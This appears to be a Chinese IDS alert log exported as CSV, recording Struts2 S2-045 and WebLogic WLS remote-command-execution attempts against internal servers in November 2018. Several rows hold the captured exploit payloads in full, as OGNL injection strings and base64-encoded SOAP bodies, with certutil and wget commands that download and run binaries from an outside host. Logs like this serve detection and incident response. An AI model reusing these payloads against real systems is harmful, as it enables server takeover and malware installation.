类型,处理状态,危险程度,时间,事件名称,事件次数,源IP,目的IP,协议摘要,上报设备,区域,规则编号,流行程度,攻击手段,服务类型,网络接口,动作,源MAC地址,源端口,目的MAC地址,目的端口,原始报文长度,原始报文内容
黑名单,未处理,高风险,2018-11-06 02:28:31,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.50,"TCP.HTTP C URL=/ HOST=111.205.126.206 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1191 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,55209,00:50:56:87:C4:9F,80,60,Lmxvb3ApDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5LS0=
灰名单,未处理,高风险,2018-11-06 02:28:31,Apache Struts远程命令执行漏洞,1,104.144.207.201,10.3.35.50,TCP.HTTP C URL=/ HOST=111.205.126.206,11.155.22.97(新一代汇聚层5),北京新一代,21374,低,获取权限攻击,CGI,T1/2,高风险,0C:DA:41:6B:D7:00,55209,00:50:56:87:C4:9F,80,60,Lmxvb3ApDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5LS0=
灰名单,未处理,高风险,2018-11-06 02:28:30,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.76,"TCP.HTTP C URL=/ HOST=111.205.126.206 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&cmd.exe /c c:/fast.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=264 POST-DATA=--bc23a13f31024ac8a552256bb237d599
Content-Disposition: form-data; name=""image1""
Content-Type: text/plain; charset=utf-8

certutil.exe -urlcache -",11.155.22.96(新一代汇聚层4),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,20550,00:50:56:87:35:66,80,16,YjIzN2Q1OTktLQ==
灰名单,未处理,高风险,2018-11-06 02:28:30,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.61,TCP.HTTP C,11.170.236.111(新一代汇聚层),北京新一代,24174,中,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,58025,00:50:56:87:5A:17,80,536,ZWFkKGIsMCw1MTIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3MuY2xvc2UoKTtpcy5jbG9zZSgpO2guZGlzY29ubmVjdCgpO2lmKF9wLmNvbnRhaW5zKCIubG9vcCIpKXtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJjaG1vZCA3NzcgIiArIF9wKTtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJub2h1cCAiICsgX3AgKyAiICYiKTt9ZWxzZXtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKF9jKTt9b3V0LnByaW50KCJWZXIiKTtvdXQucHJpbnQoInNpb25fX18iKTslPl1dPjwvc3RyaW5nPjwvdm9pZD48dm9pZCBtZXRob2Q9ImNsb3NlIi8+PC9vYmplY3Q+PC9qYXZhPjwvamF2YT48L3dvcms6V29ya0NvbnRleHQ+PC9zb2FwZW52OkhlYWRlcj48c29hcGVudjpCb2R5Lz48L3NvYXBlbnY6RW52ZWxvcGU+
黑名单,未处理,高风险,2018-11-06 02:28:30,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.55,"TCP.HTTP C URL=/ HOST=111.205.126.206 CONTENT-TYPE=multipart/form-data; boundary=6f86850e80e8dcca6a2c3dcf558f1329 CONTENT-LENGTH=1082 POST-DATA=--6f86850e80e8dcca6a2c3dcf558f1329
Content-Disposition: form-data; name=""upload""; filename=""%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DE",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,44492,00:50:56:87:B2:75,80,1876,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4yMDYNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZCI7IGZpbGVuYW1lPSIleygjbmlrZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScpLigjZG09QG9nbmwuT2dubENvbnRleHRAREVGQVVMVF9NRU1CRVJfQUNDRVNTKS4oI19tZW1iZXJBY2Nlc3M/KCNfbWVtYmVyQWNjZXNzPSNkbSk6KCgjY29udGFpbmVyPSNjb250ZXh0Wydjb20ub3BlbnN5bXBob255Lnh3b3JrMi5BY3Rpb25Db250ZXh0LmNvbnRhaW5lciddKS4oI29nbmxVdGlsPSNjb250YWluZXIuZ2V0SW5zdGFuY2UoQGNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLm9nbmwuT2dubFV0aWxAY2xhc3MpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkUGFja2FnZU5hbWVzKCkuY2xlYXIoKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZENsYXNzZXMoKS5jbGVhcigpKS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKCNkbSkpKSkuKCNjbWQ9JzExMTExMTExMTExJykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfS5iIg0KQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluDQoNCmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmNtZC5leGUgL2MgYzovZmFzdC5leGUNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjktLQ==
灰名单,未处理,高风险,2018-11-06 02:28:30,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.35.73,"TCP.HTTP C URL=/ HOST=111.205.126.206 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='uname --m|grep x86_64>>/dev/null||(pkill loop && wget -O .loop http://111.90.158.225/d/ft32 && chmod 777 .loop && ./.loop)&&(pkill loop && wget -O .loop http://111.90.158.225/d/ft64&&chmod 777 .loop&& ./.loop)').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=373 POST-DATA=--bc23a13f31024ac8a552256bb237d599
Content-Disposition: form-data; name=""image1""
Content-Type: text/plain; charset=utf-8

uname --m|grep x86_64>>/",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,20523,00:50:56:87:C3:B5,80,276,bG9vcCAmJiB3Z2V0IC1PIC5sb29wIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Z0MzIgJiYgY2htb2QgNzc3IC5sb29wICYmIC4vLmxvb3ApJiYocGtpbGwgbG9vcCAmJiB3Z2V0IC1PIC5sb29wIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Z0NjQmJmNobW9kIDc3NyAubG9vcCYmIC4vLmxvb3ApDQotLWJjMjNhMTNmMzEwMjRhYzhhNTUyMjU2YmIyMzdkNTk5LS0=
灰名单,未处理,高风险,2018-11-06 02:28:30,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.61,TCP.HTTP C,11.155.22.97(新一代汇聚层5),北京新一代,24174,中,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,28472,00:50:56:87:5A:17,80,536,ZWFkKGIsMCw1MTIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3MuY2xvc2UoKTtpcy5jbG9zZSgpO2guZGlzY29ubmVjdCgpO2lmKF9wLmNvbnRhaW5zKCIubG9vcCIpKXtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJjaG1vZCA3NzcgIiArIF9wKTtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJub2h1cCAiICsgX3AgKyAiICYiKTt9ZWxzZXtSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKF9jKTt9b3V0LnByaW50KCJWZXIiKTtvdXQucHJpbnQoInNpb25fX18iKTslPl1dPjwvc3RyaW5nPjwvdm9pZD48dm9pZCBtZXRob2Q9ImNsb3NlIi8+PC9vYmplY3Q+PC9qYXZhPjwvamF2YT48L3dvcms6V29ya0NvbnRleHQ+PC9zb2FwZW52OkhlYWRlcj48c29hcGVudjpCb2R5Lz48L3NvYXBlbnY6RW52ZWxvcGU+
灰名单,未处理,高风险,2018-11-06 02:28:30,Apache Struts远程命令执行漏洞,1,104.144.207.201,10.3.35.55,TCP.HTTP C URL=/ HOST=111.205.126.206,11.155.22.97(新一代汇聚层5),北京新一代,21374,低,获取权限攻击,CGI,T1/1,高风险,0C:DA:41:6B:D7:00,44492,00:50:56:87:B2:75,80,1876,UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiAxMTEuMjA1LjEyNi4yMDYNCkFjY2VwdDogKi8qDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xMl8zKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTYuMC4yOTI0Ljg3IFNhZmFyaS81MzcuMzYNCkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9NmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjkNCkNvbnRlbnQtTGVuZ3RoOiAxMDgyDQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQotLTZmODY4NTBlODBlOGRjY2E2YTJjM2RjZjU1OGYxMzI5DQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwbG9hZCI7IGZpbGVuYW1lPSIleygjbmlrZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YScpLigjZG09QG9nbmwuT2dubENvbnRleHRAREVGQVVMVF9NRU1CRVJfQUNDRVNTKS4oI19tZW1iZXJBY2Nlc3M/KCNfbWVtYmVyQWNjZXNzPSNkbSk6KCgjY29udGFpbmVyPSNjb250ZXh0Wydjb20ub3BlbnN5bXBob255Lnh3b3JrMi5BY3Rpb25Db250ZXh0LmNvbnRhaW5lciddKS4oI29nbmxVdGlsPSNjb250YWluZXIuZ2V0SW5zdGFuY2UoQGNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLm9nbmwuT2dubFV0aWxAY2xhc3MpKS4oI29nbmxVdGlsLmdldEV4Y2x1ZGVkUGFja2FnZU5hbWVzKCkuY2xlYXIoKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZENsYXNzZXMoKS5jbGVhcigpKS4oI2NvbnRleHQuc2V0TWVtYmVyQWNjZXNzKCNkbSkpKSkuKCNjbWQ9JzExMTExMTExMTExJykuKCNpc3dpbj0oQGphdmEubGFuZy5TeXN0ZW1AZ2V0UHJvcGVydHkoJ29zLm5hbWUnKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCd3aW4nKSkpLigjY21kcz0oI2lzd2luP3snY21kLmV4ZScsJy9jJywjY21kfTp7Jy9iaW4vYmFzaCcsJy1jJywjY21kfSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwLnJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNvbW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI3JvcykpLigjcm9zLmZsdXNoKCkpfS5iIg0KQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluDQoNCmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmNtZC5leGUgL2MgYzovZmFzdC5leGUNCi0tNmY4Njg1MGU4MGU4ZGNjYTZhMmMzZGNmNTU4ZjEzMjktLQ==
灰名单,未处理,高风险,2018-11-06 02:28:30,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.61,TCP.HTTP C,11.155.22.96(新一代汇聚层4),北京新一代,24174,中,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,28401,00:50:56:87:5A:17,80,1832,UE9TVCAvd2xzLXdzYXQvQ29vcmRpbmF0b3JQb3J0VHlwZSBIVFRQLzEuMQ0KSG9zdDogMTExLjIwNS4xMjYuMTY0DQpBY2NlcHQ6ICovKg0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCkNvbnRlbnQtdHlwZTogdGV4dC94bWwNCkNvbnRlbnQtTGVuZ3RoOiAxMTg1DQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQo8c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+IAogICA8c29hcGVudjpIZWFkZXI+CiAgICAgICA8d29yazpXb3JrQ29udGV4dCB4bWxuczp3b3JrPSJodHRwOi8vYmVhLmNvbS8yMDA0LzA2L3NvYXAvd29ya2FyZWEvIj4KICAgICAgICAgICA8amF2YSB2ZXJzaW9uPSIxLjguMF8xNTEiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgPGFycmF5IGNsYXNzPSJqYXZhLmxhbmcuU3RyaW5nIiBsZW5ndGg9IjMiPgogICAgICAgICAgICAgICAgICAgICAgPHZvaWQgaW5kZXggPSAiMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgPHN0cmluZz4vYmluL2Jhc2g8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIGluZGV4ID0gIjEiPgogICAgICAgICAgICAgICAgICAgICAgICAgIDxzdHJpbmc+LWM8L3N0cmluZz4KICAgICAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgICAgICAgICAgIDx2b2lkIGluZGV4ID0gIjIiPgogICAgICAgICAgICAgICAgICAgICAgCTxzdHJpbmc+dW5hbWUgLS1tfGdyZXAgeDg2XzY0Jmd0OyZndDsvZGV2L251bGx8fChwa2lsbCBsb29wICZhbXA7JmFtcDsgd2dldCAtTyAubG9vcCBodHRwOi8vMTExLjkwLjE1OC4yMjUvZC9mdDMyICZhbXA7JmFtcDsgY2htb2QgNzc3IC5sb29wICZhbXA7JmFtcDsgLi8ubG9vcCkmYW1wOyZhbXA7KHBraWxsIGxvb3AgJmFtcDsmYW1wOyB3Z2V0IC1PIC5sb29wIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Z0NjQmYW1wOyZhbXA7Y2htb2QgNzc3IC5sb29wJmFtcDsmYW1wOyAuLy5sb29wKTwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICA8L2FycmF5PgogICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9InN0YXJ0Ii8+CiAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgPC9zb2FwZW52OkhlYWRlcj4KICAgPHNvYXBlbnY6Qm9keS8+Cjwvc29hcGVudjpFbnZlbG9wZT4=
灰名单,未处理,高风险,2018-11-06 02:28:29,WebLogic WLS 组件远程命令执行漏洞,1,104.144.207.201,10.3.38.63,TCP.HTTP C,11.170.236.111(新一代汇聚层),北京新一代,24174,中,获取权限攻击,www,T1/2,高风险,0C:DA:41:6B:D7:00,21611,00:50:56:87:14:99,80,1592,UE9TVCAvd2xzLXdzYXQvQ29vcmRpbmF0b3JQb3J0VHlwZSBIVFRQLzEuMQ0KSG9zdDogMTExLjIwNS4xMjYuMTY1DQpBY2NlcHQ6ICovKg0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUNCkNvbnRlbnQtdHlwZTogdGV4dC94bWwNCkNvbnRlbnQtTGVuZ3RoOiAxMDA1DQpYLUZvcndhcmRlZC1Gb3I6IDEwNC4xNDQuMjA3LjIwMQ0KDQo8c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyI+IAogICA8c29hcGVudjpIZWFkZXI+CiAgICAgICA8d29yazpXb3JrQ29udGV4dCB4bWxuczp3b3JrPSJodHRwOi8vYmVhLmNvbS8yMDA0LzA2L3NvYXAvd29ya2FyZWEvIj4KICAgICAgICAgICA8amF2YSB2ZXJzaW9uPSIxLjguMF8xNTEiIGNsYXNzPSJqYXZhLmJlYW5zLlhNTERlY29kZXIiPgogICAgICAgICAgICAgICA8dm9pZCBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICAgICAgICAgICAgPGFycmF5IGNsYXNzPSJqYXZhLmxhbmcuU3RyaW5nIiBsZW5ndGg9IjMiPgogICAgICAgICAgICAgICAgICAgICAgPHZvaWQgaW5kZXggPSAiMCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgPHN0cmluZz5jbWQuZXhlPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleCA9ICIxIj4KICAgICAgICAgICAgICAgICAgICAgICAgICA8c3RyaW5nPi9jPC9zdHJpbmc+CiAgICAgICAgICAgICAgICAgICAgICA8L3ZvaWQ+CiAgICAgICAgICAgICAgICAgICAgICA8dm9pZCBpbmRleCA9ICIyIj4KICAgICAgICAgICAgICAgICAgICAgIAk8c3RyaW5nPmNlcnR1dGlsLmV4ZSAtdXJsY2FjaGUgLXNwbGl0IC1mIGh0dHA6Ly8xMTEuOTAuMTU4LjIyNS9kL2Zhc3QuZXhlIGM6L2Zhc3QuZXhlJmFtcDtjOi9mYXN0LmV4ZTwvc3RyaW5nPgogICAgICAgICAgICAgICAgICAgICAgPC92b2lkPgogICAgICAgICAgICAgICAgICA8L2FycmF5PgogICAgICAgICAgICAgICAgICA8dm9pZCBtZXRob2Q9InN0YXJ0Ii8+CiAgICAgICAgICAgICAgICAgIDwvdm9pZD4KICAgICAgICAgICAgPC9qYXZhPgogICAgICAgIDwvd29yazpXb3JrQ29udGV4dD4KICAgPC9zb2FwZW52OkhlYWRlcj4KICAgPHNvYXBlbnY6Qm9keS8+Cjwvc29hcGVudjpFbnZlbG9wZT4=
灰名单,未处理,高风险,2018-11-06 02:28:29,Struts2远程命令执行漏洞(s2-045)(s2-046)(CVE-2017-5638),1,104.144.207.201,10.3.33.196,"TCP.HTTP C URL=/ HOST=111.205.126.208 CONTENT-TYPE=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='certutil.exe -urlcache -split -f http://111.90.158.225/d/fast.exe c:/fast.exe&cmd.exe /c c:/fast.exe').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} CONTENT-LENGTH=264 POST-DATA=--bc23a13f31024ac8a552256bb237d599
Content-Disposition: form-data; name=""image1""
Content-Type: text/plain; charset=utf-8

certutil.exe -urlcache -",11.155.22.97(新一代汇聚层5),北京新一代,23986,低,获取权限攻击,www,T1/1,高风险,0C:DA:41:6B:D7:00,43089,00:50:56:87:C9:7E,80,16,YjIzN2Q1OTktLQ==
